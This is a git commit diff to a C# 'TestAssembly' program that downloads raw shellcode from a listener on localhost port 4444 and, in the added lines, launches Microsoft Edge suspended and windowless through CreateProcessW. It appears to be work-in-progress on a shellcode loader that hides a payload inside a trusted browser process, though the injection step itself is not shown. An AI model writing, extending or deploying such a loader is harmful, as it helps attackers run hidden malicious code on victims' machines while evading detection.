ace764a61d49788c4eb38b65f4c6e0ab5e44ade8
Luke Hopkins <>
2025-05-18 20:46:54 +0100

    msedge is being launched

--- TestAssembly/Program.cs
+++ TestAssembly/Program.cs
@@ -1,10 +1,97 @@
-﻿using System.Net;
+﻿using System;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Threading;
 
 
 namespace TestAssembly
 {
-    public class Program
+        public class Program
     {
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern bool CreateProcessW(
+            string applicationName,
+            string commandLine,
+        IntPtr processAttributes,
+        IntPtr threadAttributes,
+            bool inheritHandles,
+        CREATION_FLAGS creationFlags,
+        IntPtr environment,
+            string currentDirectory,
+        ref STARTUPINFO startupInfo,
+        out PROCESS_INFORMATION processInformation);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool CloseHandle(IntPtr hObject);
+
+        [Flags]
+        public enum CREATION_FLAGS : uint
+        {
+            DEBUG_PROCESS = 0x00000001,
+            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
+            CREATE_SUSPENDED = 0x00000004,
+            DETACHED_PROCESS = 0x00000008,
+            CREATE_NEW_CONSOLE = 0x00000010,
+            NORMAL_PRIORITY_CLASS = 0x00000020,
+            IDLE_PRIORITY_CLASS = 0x00000040,
+            HIGH_PRIORITY_CLASS = 0x00000080,
+            REALTIME_PRIORITY_CLASS = 0x00000100,
+            CREATE_NEW_PROCESS_GROUP = 0x00000200,
+            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
+            CREATE_SEPARATE_WOW_VDM = 0x00000800,
+            CREATE_SHARED_WOW_VDM = 0x00001000,
+            CREATE_FORCEDOS = 0x00002000,
+            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
+            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
+            INHERIT_PARENT_AFFINITY = 0x00010000,
+            INHERIT_CALLER_PRIORITY = 0x00020000,
+            CREATE_PROTECTED_PROCESS = 0x00040000,
+            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
+            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
+            PROCESS_MODE_BACKGROUND_END = 0x00200000,
+            CREATE_SECURE_PROCESS = 0x00400000,
+            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
+            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
+            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
+            CREATE_NO_WINDOW = 0x08000000,
+            PROFILE_USER = 0x10000000,
+            PROFILE_KERNEL = 0x20000000,
+            PROFILE_SERVER = 0x40000000,
+            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFO
+        {
+            public int cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public int dwX;
+            public int dwY;
+            public int dwXSize;
+            public int dwYSize;
+            public int dwXCountChars;
+            public int dwYCountChars;
+            public int dwFillAttribute;
+            public int dwFlags;
+            public short wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
         public Program()
         {
             byte[] shellcode;
@@ -20,6 +107,26 @@ namespace TestAssembly
 
                 shellcode = client.DownloadData("http://localhost:4444/shellcode.bin");
             };
+
+            var startup = new STARTUPINFO { dwFlags = 0x00000001 };
+            startup.cb = Marshal.SizeOf(startup);
+
+            var success = CreateProcessW(
+                @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+                @"""C:\Program Files\(x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start /prefetch:5""",
+                IntPtr.Zero,
+                IntPtr.Zero,
+                false,
+                CREATION_FLAGS.CREATE_NO_WINDOW | CREATION_FLAGS.CREATE_SUSPENDED,
+                IntPtr.Zero,
+                @"C:\Program Files (x86)\Microsoft\Edge\Application",
+                ref startup,
+                out var processInfo);
+
+            Thread.Sleep(30_000);
+
+            CloseHandle(processInfo.hThread);
+            CloseHandle(processInfo.hProcess);
         }
     }
 }
